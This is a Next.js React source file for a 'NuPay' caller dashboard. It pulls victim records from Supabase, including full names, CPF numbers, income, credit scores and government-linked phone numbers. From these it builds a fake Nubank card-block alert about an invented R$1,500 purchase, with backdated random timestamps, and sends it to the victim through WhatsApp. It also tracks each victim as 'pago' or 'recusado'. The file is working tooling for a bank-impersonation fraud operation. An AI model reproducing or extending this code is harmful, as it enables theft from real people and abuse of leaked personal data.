'use client'

import { useEffect, useState, useCallback } from 'react'
import { useRouter } from 'next/navigation'
import {
  PhoneCall,
  MapPin,
  CreditCard,
  LogOut,
  CheckCircle2,
  MessageSquare,
  Loader2,
  ShieldCheck,
  Zap,
  Search,
  RefreshCcw,
  Smartphone,
  UserCircle2,
  X,
  ChevronRight,
  Calendar,
  TrendingUp,
  Phone,
  Clock,
  Star,
  History
} from 'lucide-react'
import { cn } from '@/lib/utils'
import { supabase, Lead } from '@/lib/supabase'
import { InteractiveMenu } from '@/components/InteractiveMenu'

export default function LigadorDashboard() {
  const router = useRouter()
  const [activeTab, setActiveTab] = useState<'pendentes' | 'finalizadas'>('pendentes')
  const [authorized, setAuthorized] = useState(false)
  const [loading, setLoading] = useState(true)
  const [leads, setLeads] = useState<Lead[]>([])
  const [selectedLead, setSelectedLead] = useState<Lead | null>(null)
  const [saving, setSaving] = useState(false)
  const [searchTerm, setSearchTerm] = useState('')
  const [userName, setUserName] = useState('Ligador')
  const [msgValor, setMsgValor] = useState('1.500,00')
  const [msgData, setMsgData] = useState('')
  const [msgHora, setMsgHora] = useState('')
  const [msgCopied, setMsgCopied] = useState(false)

  // Generate default date/time (2-4 hours ago)
  const generateDefaultDateTime = useCallback(() => {
    const now = new Date()
    const hoursAgo = 2 + Math.floor(Math.random() * 3) // 2-4 hours
    const past = new Date(now.getTime() - hoursAgo * 60 * 60 * 1000)
    const day = String(past.getDate()).padStart(2, '0')
    const month = String(past.getMonth() + 1).padStart(2, '0')
    const year = past.getFullYear()
    const hours = String(past.getHours()).padStart(2, '0')
    const minutes = String(past.getMinutes()).padStart(2, '0')
    setMsgData(`${day}/${month}/${year}`)
    setMsgHora(`${hours}:${minutes}`)
  }, [])

  // Reset message fields when selecting a new lead
  useEffect(() => {
    if (selectedLead) {
      setMsgValor('1.500,00')
      generateDefaultDateTime()
      setMsgCopied(false)
    }
  }, [selectedLead, generateDefaultDateTime])

  const buildMessage = useCallback(() => {
    const nome = selectedLead?.full_name?.split(' ')[0] || 'Cliente'
    const nomeFormatado = nome.charAt(0).toUpperCase() + nome.slice(1).toLowerCase()
    return `Nubank: Segurança do Cartão 💳\n\nOlá, ${nomeFormatado}. Identificamos uma tentativa de compra que foge do seu perfil de uso e, por segurança, o seu cartão foi bloqueado temporariamente.\n\nDados da transação:\n🛒 Estabelecimento: Recarga Pay Brasil (online)\n💰 Valor: R$ ${msgValor}\n📅 Data: ${msgData} às ${msgHora}\n\nVocê reconhece essa transação?`
  }, [selectedLead, msgValor, msgData, msgHora])

  const handleCopyMessage = useCallback(async () => {
    try {
      await navigator.clipboard.writeText(buildMessage())
      setMsgCopied(true)
      setTimeout(() => setMsgCopied(false), 2000)
    } catch {
      // Fallback
      const ta = document.createElement('textarea')
      ta.value = buildMessage()
      document.body.appendChild(ta)
      ta.select()
      document.execCommand('copy')
      document.body.removeChild(ta)
      setMsgCopied(true)
      setTimeout(() => setMsgCopied(false), 2000)
    }
  }, [buildMessage])

  const fetchLeads = useCallback(async () => {
    const ligadorId = localStorage.getItem('nupay_ligador_id')
    if (!ligadorId) return

    setLoading(true)
    const { data, error } = await supabase
      .from('leads')
      .select('*')
      .eq('owner_id', ligadorId)
      .in('status', activeTab === 'pendentes' ? ['atribuido'] : ['arquivado', 'pago', 'recusado'])
      .order('updated_at', { ascending: false })

    if (!error && data) {
      setLeads(data as Lead[])
    }
    setLoading(false)
  }, [activeTab])

  useEffect(() => {
    const user = localStorage.getItem('nupay_ligador_user')
    const ligadorId = localStorage.getItem('nupay_ligador_id')

    if (!user || !ligadorId) {
      router.push('/login')
    } else {
      setUserName(user)
      setAuthorized(true)
      fetchLeads()
    }
  }, [router, fetchLeads])

  const handleFinalize = async (leadId: string, status: 'pago' | 'recusado') => {
    setSaving(true)
    const { error } = await supabase
      .from('leads')
      .update({ status: status, updated_at: new Date().toISOString() })
      .eq('id', leadId)

    if (!error) {
      setLeads(prev => prev.filter(l => l.id !== leadId))
      setSelectedLead(null)
    }
    setSaving(false)
  }

  const filteredLeads = leads.filter(l =>
    l.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    l.cpf?.includes(searchTerm)
  )

  // Lock body scroll when modal is open
  useEffect(() => {
    if (selectedLead) {
      document.body.style.overflow = 'hidden'
      document.body.style.touchAction = 'none'
    } else {
      document.body.style.overflow = ''
      document.body.style.touchAction = ''
    }
    return () => {
      document.body.style.overflow = ''
      document.body.style.touchAction = ''
    }
  }, [selectedLead])

  if (!authorized) {
    return (
      <div className="min-h-screen bg-[#0a0a0f] flex flex-col items-center justify-center p-4">
        <div className="relative">
          <div className="w-20 h-20 rounded-full flex items-center justify-center animate-pulse" style={{ background: 'linear-gradient(135deg, #820AD1, #6B07AB)' }}>
            <div className="w-16 h-16 rounded-full bg-[#0a0a0f] flex items-center justify-center">
              <Loader2 className="w-8 h-8 animate-spin" style={{ color: '#820AD1' }} />
            </div>
          </div>
          <div className="absolute inset-0 blur-[60px] rounded-full" style={{ background: 'rgba(130,10,209,0.3)' }} />
        </div>
        <p className="text-sm font-semibold mt-6 animate-pulse" style={{ color: '#820AD1' }}>Carregando...</p>
      </div>
    )
  }

  return (
    <div className="min-h-screen selection:bg-primary/20">
      {/* ===== HEADER ===== */}
      <header className="sticky top-0 z-50 glass-deep border-b border-white/5 px-6 py-4 md:px-12 md:py-6">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 rounded-2xl glass glow-primary flex items-center justify-center font-display text-primary text-xl font-bold border-primary/20 rotate-3 hover:rotate-0 transition-transform cursor-pointer">
              nu
            </div>
            <div className="hidden sm:block">
              <h1 className="font-display text-2xl tracking-tight leading-none text-white">NuPay</h1>
              <p className="text-[9px] font-mono font-bold uppercase tracking-[0.3em] text-cyan-400 mt-1">{userName}</p>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <div className="flex glass-deep p-1 rounded-2xl border-white/5 mr-4 hidden md:flex">
              <button
                onClick={() => setActiveTab('pendentes')}
                className={cn(
                  "px-6 py-2.5 rounded-xl text-[10px] font-mono font-bold uppercase tracking-widest transition-all",
                  activeTab === 'pendentes' ? "bg-primary text-white shadow-glow" : "text-zinc-500 hover:text-white"
                )}
              >
                Fichas ({leads.length})
              </button>
              <button
                onClick={() => setActiveTab('finalizadas')}
                className={cn(
                  "px-6 py-2.5 rounded-xl text-[10px] font-mono font-bold uppercase tracking-widest transition-all",
                  activeTab === 'finalizadas' ? "bg-white/10 text-white" : "text-zinc-500 hover:text-white"
                )}
              >
                Histórico
              </button>
            </div>

            <button
              onClick={() => fetchLeads()}
              className="w-11 h-11 rounded-2xl glass-deep flex items-center justify-center hover:bg-white/10 active:scale-90 transition-all border-white/5"
            >
              <RefreshCcw className={cn("w-4 h-4 text-zinc-400", loading && "animate-spin text-primary")} />
            </button>
            <button
              onClick={() => {
                localStorage.removeItem('nupay_ligador_user')
                localStorage.removeItem('nupay_ligador_id')
                router.push('/login')
              }}
              className="w-11 h-11 rounded-2xl glass-deep flex items-center justify-center hover:bg-destructive/20 active:scale-90 transition-all border-white/5 group"
            >
              <LogOut className="w-4 h-4 text-zinc-400 group-hover:text-destructive transition-colors" />
            </button>
          </div>
        </div>
      </header>

      {/* ===== SEARCH BAR ===== */}
      <div className="px-6 py-6 md:px-12">
        <div className="max-w-6xl mx-auto relative group">
          <Search className="absolute left-6 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-600 group-focus-within:text-cyan-400 transition-colors" />
          <input
            type="text"
            placeholder="Buscar por nome ou CPF..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full pl-14 pr-6 py-4.5 rounded-2xl glass-deep border border-white/5 outline-none transition-all text-sm font-mono uppercase tracking-widest placeholder:text-zinc-700 focus:border-cyan-500/30"
          />
        </div>
      </div>

      {/* ===== CONTENT ===== */}
      <main className="flex-1 px-6 pb-32 md:px-12">
        <div className="max-w-6xl mx-auto">
          {loading ? (
            <div className="flex flex-col items-center justify-center py-24 space-y-6">
              <Loader2 className="w-12 h-12 animate-spin text-cyan-400 glow-cyan rounded-full" />
              <p className="text-[10px] font-mono text-zinc-500 uppercase tracking-[0.5em] animate-pulse">Sincronizando Fichas...</p>
            </div>
          ) : filteredLeads.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-20 space-y-8 animate-in fade-in duration-700">
              <div className="w-24 h-24 rounded-[32px] glass-deep flex items-center justify-center border-white/5">
                <PhoneCall className="w-10 h-10 text-zinc-800" />
              </div>
              <div className="text-center space-y-3">
                <h3 className="text-3xl font-display uppercase tracking-tight text-white italic">Fila Vazia</h3>
                <p className="text-[10px] font-mono text-zinc-600 uppercase tracking-widest leading-relaxed">Nenhuma ficha pendente no momento.</p>
              </div>
              <button
                onClick={() => fetchLeads()}
                className="px-10 py-5 rounded-2xl glass-card text-xs font-mono font-bold text-primary uppercase tracking-[0.3em] hover:text-white"
              >
                Atualizar Fila
              </button>
            </div>
          ) : (
            <div className="bento-grid">
              {filteredLeads.map((lead, idx) => (
                <div
                  key={lead.id}
                  onClick={() => setSelectedLead(lead)}
                  className={cn(
                    "glass-card p-6 flex flex-col items-center text-center gap-6 cursor-pointer group relative overflow-hidden",
                    `stagger-${(idx % 5) + 1} animate-in fade-in slide-in-from-bottom-4`
                  )}
                >
                  <div className="absolute top-0 right-0 w-24 h-24 bg-primary/5 blur-2xl rounded-full" />
                  
                  {/* Avatar */}
                  <div className="w-20 h-20 rounded-[28px] glass glow-primary flex items-center justify-center shrink-0 group-hover:scale-110 transition-transform member-badge">
                    <UserCircle2 className="w-10 h-10 text-primary-light" />
                  </div>

                  {/* Info */}
                  <div className="w-full space-y-2 relative z-10">
                    <h4 className="font-display text-xl tracking-tight text-white group-hover:text-cyan-400 transition-colors uppercase italic">
                      {lead.full_name?.split(' ')[0] || 'Cliente'}
                    </h4>
                    <p className="text-[10px] text-zinc-600 font-mono tracking-[0.2em] uppercase">
                      CPF {lead.cpf?.slice(0, 3)}..{lead.cpf?.slice(-2)}
                    </p>
                    
                    <div className="pt-4 border-t border-white/5 mt-4">
                      <p className="text-2xl font-display italic text-emerald-400 leading-none">
                        {lead.income ? Number(lead.income).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL', maximumFractionDigits: 0 }) : '---'}
                      </p>
                      <p className="text-[8px] font-mono text-zinc-700 uppercase tracking-[0.3em] mt-2">Renda Estimada</p>
                    </div>

                    {lead.num_gov && (
                      <div className="mt-4">
                        <span className="text-[9px] bg-emerald-500/10 text-emerald-400 px-4 py-1.5 rounded-full font-mono border border-emerald-500/20 uppercase tracking-widest italic glow-emerald">GOV VINCULADO</span>
                      </div>
                    )}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </main>

      {/* ===== DETAIL MODAL ===== */}
      {selectedLead && (
        <div className="fixed inset-0 z-[10000] bg-background/90 backdrop-blur-3xl overflow-y-auto overscroll-contain animate-in fade-in duration-500">
          <div className="min-h-full flex flex-col p-6 animate-in zoom-in-95 duration-500">
            <div className="max-w-4xl mx-auto w-full glass-deep rounded-[48px] overflow-hidden border-white/10 shadow-[0_0_100px_rgba(0,0,0,0.8)]">
              {/* Modal Header */}
              <div className="relative px-8 pt-12 pb-14 border-b border-white/5 bg-white/[0.01]">
                <button
                  onClick={() => setSelectedLead(null)}
                  className="absolute top-8 right-8 w-12 h-12 rounded-2xl glass-deep hover:bg-destructive transition-all flex items-center justify-center z-20 border-white/5"
                >
                  <X className="w-6 h-6 text-zinc-400" />
                </button>

                <div className="relative z-10 flex flex-col items-center text-center">
                  <div className="w-28 h-28 rounded-[36px] glass glow-primary flex items-center justify-center shadow-2xl mb-8 border-primary/20">
                    <UserCircle2 className="w-14 h-14 text-primary-light" />
                  </div>
                  <h3 className="text-4xl font-display uppercase tracking-tight leading-none text-white italic max-w-[400px]">
                    {selectedLead.full_name || 'Registro Ativo'}
                  </h3>
                  <div className="flex items-center gap-4 mt-4">
                    <p className="text-[11px] font-mono text-zinc-500 uppercase tracking-widest">IDENTIFICAÇÃO: <span className="text-cyan-400">{selectedLead.cpf}</span></p>
                    <div className="w-1 h-1 rounded-full bg-zinc-800" />
                    <p className="text-[11px] font-mono text-zinc-500 uppercase tracking-widest">IDADE: <span className="text-white">{selectedLead.age || '??'} ANOS</span></p>
                  </div>
                </div>
              </div>

              {/* Modal Body */}
              <div className="p-8 md:p-12 space-y-10">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                  {/* Score e Renda */}
                  <div className="glass-card p-10 space-y-8 border-cyan-500/10">
                    <div className="flex justify-between items-end">
                      <div className="space-y-2">
                        <p className="text-[10px] font-mono uppercase text-zinc-500 tracking-widest">Score Crédito</p>
                        <p className="text-5xl font-display italic text-cyan-400 glow-cyan leading-none">{selectedLead.score || '--'}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-[10px] font-mono uppercase text-zinc-500 tracking-widest mb-2">Estado</p>
                        <p className="text-2xl font-display text-white italic uppercase tracking-widest">{selectedLead.state || 'UF'}</p>
                      </div>
                    </div>
                    <div className="w-full h-1 bg-white/5 rounded-full overflow-hidden">
                      <div className="h-full bg-cyan-400 shadow-glow" style={{ width: `${(Number(selectedLead.score || 0) / 1000) * 100}%` }} />
                    </div>
                  </div>

                  {/* Número Gov */}
                  <div className="glass-card p-10 border-emerald-500/10 bg-emerald-500/5 relative overflow-hidden group">
                    <Smartphone className="absolute -right-6 -bottom-6 w-32 h-32 text-emerald-500/10 rotate-12 group-hover:scale-110 transition-transform duration-1000" />
                    <div className="relative z-10 space-y-4">
                      <p className="text-[10px] font-mono font-bold uppercase tracking-widest text-emerald-500 italic">Telefone Vinculado GOV</p>
                      <p className="text-4xl font-display text-white tracking-tighter leading-none glow-emerald">
                        {selectedLead.num_gov || 'NÃO LOCALIZADO'}
                      </p>
                    </div>
                  </div>
                </div>

                {/* Script Section */}
                <div className="glass-card p-10 border-white/5 space-y-8">
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 rounded-2xl glass glow-primary flex items-center justify-center border-primary/20">
                      <MessageSquare className="w-6 h-6 text-primary" />
                    </div>
                    <h5 className="text-lg font-display uppercase italic tracking-tight text-white">Script de Segurança</h5>
                  </div>

                  <div className="grid grid-cols-2 gap-6">
                    <div className="space-y-4">
                      <label className="text-[10px] font-mono uppercase tracking-[0.3em] text-zinc-600 block px-2">Valor Transação</label>
                      <input
                        type="text"
                        value={msgValor}
                        onChange={e => setMsgValor(e.target.value)}
                        className="w-full glass-deep border border-white/5 rounded-2xl py-5 px-6 text-sm font-mono font-bold italic outline-none focus:border-primary/40 transition-all text-center"
                      />
                    </div>
                    <div className="space-y-4">
                      <label className="text-[10px] font-mono uppercase tracking-[0.3em] text-zinc-600 block px-2">Data Registro</label>
                      <input
                        type="text"
                        value={msgData}
                        onChange={e => setMsgData(e.target.value)}
                        className="w-full glass-deep border border-white/5 rounded-2xl py-5 px-6 text-sm font-mono font-bold italic outline-none focus:border-primary/40 transition-all text-center"
                      />
                    </div>
                  </div>

                  <div className="bg-white/[0.02] rounded-3xl p-8 border border-white/5 italic text-zinc-400 text-sm leading-relaxed whitespace-pre-line font-mono tracking-tight selection:bg-primary/30">
                    {buildMessage()}
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-4">
                    <button
                      onClick={handleCopyMessage}
                      className="py-5 rounded-2xl glass glow-primary border-primary/30 text-xs font-mono font-bold uppercase tracking-[0.2em] active:scale-95 transition-all flex items-center justify-center gap-3 text-primary-light hover:bg-primary hover:text-white"
                    >
                      {msgCopied ? 'Copiado para Área!' : 'Copiar Abordagem'}
                    </button>
                    {selectedLead.num_gov && (
                      <button
                        onClick={() => {
                          const msg = encodeURIComponent(buildMessage())
                          window.open(`https://wa.me/55${selectedLead.num_gov?.replace(/\D/g, '')}?text=${msg}`, '_blank')
                        }}
                        className="py-5 bg-emerald-500 rounded-2xl font-mono font-bold uppercase tracking-widest text-white shadow-[0_10px_30px_rgba(16,185,129,0.3)] active:scale-95 transition-all text-xs flex items-center justify-center gap-3 hover:translate-y-[-2px]"
                      >
                        <Phone className="w-4 h-4 fill-white" />
                        Abrir WhatsApp
                      </button>
                    )}
                  </div>
                </div>

                {/* Footer Actions */}
                <div className="pt-10 border-t border-white/5 flex flex-col md:flex-row gap-6">
                  <button
                    onClick={() => setSelectedLead(null)}
                    className="flex-1 py-6 rounded-3xl glass-deep border-white/10 text-[10px] font-mono font-bold uppercase tracking-[0.4em] hover:bg-white/5 transition-all"
                  >
                    Recuar
                  </button>
                  {activeTab === 'pendentes' && (
                    <div className="flex-[2] flex gap-4">
                      <button
                        onClick={() => handleFinalize(selectedLead.id as string, 'recusado')}
                        disabled={saving}
                        className="flex-1 py-6 rounded-3xl glass-deep border-destructive/20 text-destructive text-[10px] font-mono font-bold uppercase tracking-[0.4em] hover:bg-destructive hover:text-white transition-all flex items-center justify-center gap-2"
                      >
                        {saving ? <Loader2 className="w-5 h-5 animate-spin" /> : 'Falha'}
                      </button>
                      <button
                        onClick={() => handleFinalize(selectedLead.id as string, 'pago')}
                        disabled={saving}
                        className="flex-[2] py-6 rounded-3xl bg-emerald-500 text-white text-[10px] font-mono font-bold uppercase tracking-[0.4em] active:scale-95 transition-all flex items-center justify-center gap-2 shadow-[0_15px_40px_rgba(16,185,129,0.4)] hover:translate-y-[-2px]"
                      >
                        {saving ? <Loader2 className="w-5 h-5 animate-spin" /> : 'Confirmar Sucesso'}
                      </button>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Mobile Interactive Menu */}
      <InteractiveMenu 
        activeTab={activeTab}
        setActiveTab={setActiveTab as any}
        items={[
          { id: 'pendentes', label: 'Fichas', icon: Clock },
          { id: 'finalizadas', label: 'Histórico', icon: History }
        ]}
      />
    </div>
  )
}
